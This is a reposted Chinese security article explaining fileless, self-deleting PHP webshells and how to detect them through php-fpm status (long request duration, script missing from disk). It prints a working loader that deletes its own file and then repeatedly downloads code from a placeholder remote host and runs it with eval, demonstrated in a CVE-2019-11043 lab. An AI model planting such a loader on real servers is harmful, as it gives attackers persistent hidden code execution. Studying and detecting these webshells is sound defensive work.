<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eNXt7gfKvMWlXX9_DorN6g)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

所谓 "进程驻留" 的 php 无文件攻击，利用了 PHP 的 "解析执行特性"。先执行一个 shellcode 加载器，加载器运行后删除自身，并加载远程文件，动态加载并执行真正的 shellcode。本文提供了攻击和检测思路。

**一、写在前面**
----------

所谓 "进程驻留" 的 php 无文件攻击，利用了 PHP 的 "解析执行特性"。先执行一个 shellcode 加载器，加载器运行后删除自身，并加载远程文件（远程文件是被当成字符串直接下载到 php 进程中执行），动态加载并执行真正的 shellcode。

因此，shellcode 加载器执行后，删除自身。但是真正执行 shellcode 的操作在内存中进行，整个过程 shellcode 不落地。

**二、攻击原理**
----------

*   2.1 shellcode 加载器 Demo
    

```
<?php
    chmod($_SERVER['SCRIPT_FILENAME'], 0777);
    unlink($_SERVER['SCRIPT_FILENAME']);
    ignore_user_abort(true);
    set_time_limit(0);
    echo "success";
    $remote_file = 'http://x.x.x.x/shellcode';
    while($code = file_get_contents($remote_file)){
    @eval($code);
    echo "xunhuan";
    sleep(5);
    };
?>


```

下面做一个简单的分析：

```
ignore_user_abort(true);


```

主要用于**后台运行**。这个函数的作用是指示服务器端在远程客户端关闭连接后是否继续执行下面的脚本。如设置为 True，则表示如果用户停止脚本运行，仍然不影响脚本的运行。

```
set_time_limit(0);


```

主要用于**取消脚本运行时间的超时上限**。函数参数是执行时间，如果为零说明永久执行直到程序结束。如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。但是，脚本也有可能被中间件的默认超时打断。  
中间件的默认超时时间可以通过设置 php.ini 的 max_execution_time 或 Apache .conf 的 “php_value max_execution_time” 来更改。

```
unlink($_SERVER['SCRIPT_FILENAME']);


```

主要用于**删除自身**。unlink 函数运行条件较为苛刻，该脚本要具备可执行权限、可修改文件权限时方能执行。

*   2.2 shellcodeDemo
    
    file_put_contents('printTime.txt','I am running'.time());
    
*   2.3 效果
    

shellcode 加载器执行后，删除自身，并在当前目录生成 printTime.txt。通过循环，每隔 5 秒执行一次。

这里可以使用 CVE-2019-11043 的 vulhub 试验：

上传加载器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEePW7icaDicpWJDobDIqYibXosJFCoQWDdhCSmyhlruTKus8TsibXcbwh94u8qNQtyxDOlzBP5b4BGjw/640?wx_fmt=png&from=appmsg)

执行加载器。然后观察 shellcode 是否运行（查看是否循环写入时间戳）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEePW7icaDicpWJDobDIqYibXoica9V6EwauGtVDmV8TZas9I8svqibqy4dBjdTuerx8B8PrxeyekEEQYg/640?wx_fmt=png&from=appmsg)

此时，加载器已经删除自身了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEePW7icaDicpWJDobDIqYibXoOYptpfGFTlHm3xov4mtsEabtOLeLqzFFjAl30uIhib2CkhuxXtmq0nQ/640?wx_fmt=png&from=appmsg)

**二、检测方案**
----------

此类 webshell 一直在内存中执行，因此该请求短时间内不会被 php-fpm 释放，可以通过检测 php-fpm status 中的进程信息。

开启 php-fpm status 可参考：  
https://segmentfault.com/a/1190000005792041

status 中字段的含义可参考：  
https://www.cnblogs.com/tinywan/p/6848269.html

在我们的测试环境中（CVE-2019-11043 的 vulhub），可以通过修改配置文件：

```
/usr/local/etc/php-fpm.d/www.conf


```

将 pm.status_path = /status 此行注释取消，重启 php-fpm 容器即可。重启后查看：

```
http://x.x.x.x:8080/status?full


```

通过解析 php-fpm status 的数据，可以观察以下特征：

1.  处理请求的持续时间。字段： `request duration`
    
2.  检测执行文件是否在文件系统真实存在。字段： `script`
    

这里贴一个对以上 Demo 的检测结果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEePW7icaDicpWJDobDIqYibXoFWQgicq2QvLAPIAd5Z5paEKiatwLVEy4S3A62acRhiaZNUgWZfNiasMKtA/640?wx_fmt=png&from=appmsg)

```
文章来源: https://forum.butian.net/share/95
文章作者：jweny
如有侵权请联系我们，我们会进行删除并致歉

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！  

**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk 安全知识星球, 我们一起进步一起学习。星球不定期会分享一些前言漏洞，每周安全面试经验、SRC 实战纪实等文章分享，微信识别二维码，只需 25，即可加入，如不满意，72 小时内可在 App 内无条件自助退款。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGpTtick8dYImTUOcmaQWHRzkPIp7SwgncysYUIo0cKZAcHvXcMEBL5ZZEJCIpUP08SGOR8bnejDxQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE3xxjQrLXjiaAWoqibdM1AFZ0uePzzUOG049bSjeEkbft1NfIm833fQ0ibIbW5IoE2ftnWoS3YxRPLg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)